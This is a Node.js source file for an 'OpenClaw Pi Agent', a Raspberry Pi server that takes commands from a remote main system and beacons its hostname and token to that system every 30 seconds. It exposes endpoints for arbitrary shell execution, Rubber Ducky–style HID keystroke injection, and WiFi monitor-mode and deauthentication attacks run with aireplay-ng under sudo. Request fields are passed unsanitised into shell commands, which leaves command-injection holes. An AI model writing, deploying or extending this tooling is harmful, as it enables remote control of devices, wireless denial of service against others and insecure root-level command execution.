#!/usr/bin/env node

/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║         OPENCLAW PI AGENT — LOCAL EXECUTION NODE             ║
 * ║     Lightweight remote executor for Raspberry Pi 4            ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * Connects to main OpenClaw system and executes local commands.
 * Supports: HID injection, WiFi attacks, GPIO control, hardware access.
 *
 * Usage: node agent.js
 * Environment:
 *   PI_AGENT_PORT=9000
 *   MAIN_SYSTEM_URL=http://gcp-vm-ip:3000
 *   PI_AGENT_TOKEN=secure-token
 */

"use strict";

const express = require("express");
const axios = require("axios");
const { exec } = require("child_process");
const { promisify } = require("util");
const execAsync = promisify(exec);
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());

// ══════════════════════════════════════════════════════════════
// CONFIGURATION
// ══════════════════════════════════════════════════════════════

const PI_AGENT_PORT = process.env.PI_AGENT_PORT || 9000;
const MAIN_SYSTEM_URL = process.env.MAIN_SYSTEM_URL || "http://localhost:3000";
const PI_AGENT_TOKEN = process.env.PI_AGENT_TOKEN || "secure-default-token";
const PI_HOSTNAME = require("os").hostname();

// ══════════════════════════════════════════════════════════════
// AUTHENTICATION MIDDLEWARE
// ══════════════════════════════════════════════════════════════

app.use((req, res, next) => {
  const token = req.headers.authorization?.replace("Bearer ", "");
  if (token !== PI_AGENT_TOKEN) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
});

// ══════════════════════════════════════════════════════════════
// HEALTH CHECK
// ══════════════════════════════════════════════════════════════

app.get("/health", (req, res) => {
  res.json({
    status: "online",
    pi_hostname: PI_HOSTNAME,
    port: PI_AGENT_PORT,
    uptime: process.uptime(),
  });
});

// ══════════════════════════════════════════════════════════════
// SHELL EXECUTION
// ══════════════════════════════════════════════════════════════

app.post("/execute", async (req, res) => {
  const { command } = req.body;

  if (!command) {
    return res.status(400).json({ error: "Command required" });
  }

  try {
    const { stdout, stderr } = await execAsync(command, { timeout: 30000 });
    res.json({
      success: true,
      command,
      stdout,
      stderr,
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    res.status(500).json({
      success: false,
      command,
      error: err.message,
      stderr: err.stderr || "",
    });
  }
});

// ══════════════════════════════════════════════════════════════
// HID INJECTION (USB Rubber Ducky style)
// ══════════════════════════════════════════════════════════════

app.post("/hid/inject", async (req, res) => {
  const { payload } = req.body;

  if (!payload) {
    return res.status(400).json({ error: "Payload required" });
  }

  try {
    // Execute HID payload via ydotool or similar
    const { stdout } = await execAsync(`echo "${payload}" | ydotool type --`, {
      timeout: 10000,
    });
    res.json({ success: true, message: "HID payload injected" });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════
// WIFI ATTACKS
// ══════════════════════════════════════════════════════════════

app.post("/wifi/monitor", async (req, res) => {
  const { interface } = req.body;

  if (!interface) {
    return res.status(400).json({ error: "Interface required (e.g., wlan0)" });
  }

  try {
    await execAsync(
      `sudo airmon-ng start ${interface}`,
      { timeout: 5000 }
    );
    res.json({ success: true, message: `Monitor mode started on ${interface}` });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post("/wifi/deauth", async (req, res) => {
  const { bssid, client_mac, count } = req.body;

  if (!bssid || !client_mac) {
    return res.status(400).json({ error: "BSSID and client MAC required" });
  }

  try {
    const cmd = `sudo aireplay-ng --deauth ${count || 10} -a ${bssid} -c ${client_mac} wlan0mon`;
    const { stdout } = await execAsync(cmd, { timeout: 15000 });
    res.json({ success: true, message: "Deauth packets sent" });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════
// GPIO CONTROL (Hardware)
// ══════════════════════════════════════════════════════════════

app.post("/gpio/set", async (req, res) => {
  const { pin, state } = req.body;

  if (!pin || state === undefined) {
    return res.status(400).json({ error: "Pin and state required" });
  }

  try {
    const cmd = `echo ${state} > /sys/class/gpio/gpio${pin}/value`;
    await execAsync(`sudo bash -c "${cmd}"`, { timeout: 5000 });
    res.json({ success: true, message: `GPIO ${pin} set to ${state}` });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════
// SYSTEM INFO
// ══════════════════════════════════════════════════════════════

app.get("/system/info", async (req, res) => {
  try {
    const { stdout: cpu } = await execAsync("cat /proc/cpuinfo | grep 'model name'");
    const { stdout: mem } = await execAsync(
      "free -h | grep Mem | awk '{print $2}'"
    );
    const { stdout: uptime } = await execAsync("uptime -p");

    res.json({
      hostname: PI_HOSTNAME,
      cpu: cpu.trim(),
      memory: mem.trim(),
      uptime: uptime.trim(),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ══════════════════════════════════════════════════════════════
// STARTUP & HEARTBEAT
// ══════════════════════════════════════════════════════════════

app.listen(PI_AGENT_PORT, () => {
  console.log(`[PI AGENT] Running on port ${PI_AGENT_PORT}`);
  console.log(`[PI AGENT] Hostname: ${PI_HOSTNAME}`);
  console.log(`[PI AGENT] Main system: ${MAIN_SYSTEM_URL}`);
  console.log(`[PI AGENT] Ready for commands.`);
});

// Register with main system
setInterval(async () => {
  try {
    await axios.post(`${MAIN_SYSTEM_URL}/api/pi/register`, {
      hostname: PI_HOSTNAME,
      port: PI_AGENT_PORT,
      token: PI_AGENT_TOKEN,
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    console.log("[PI AGENT] Main system not reachable (will retry)");
  }
}, 30000);
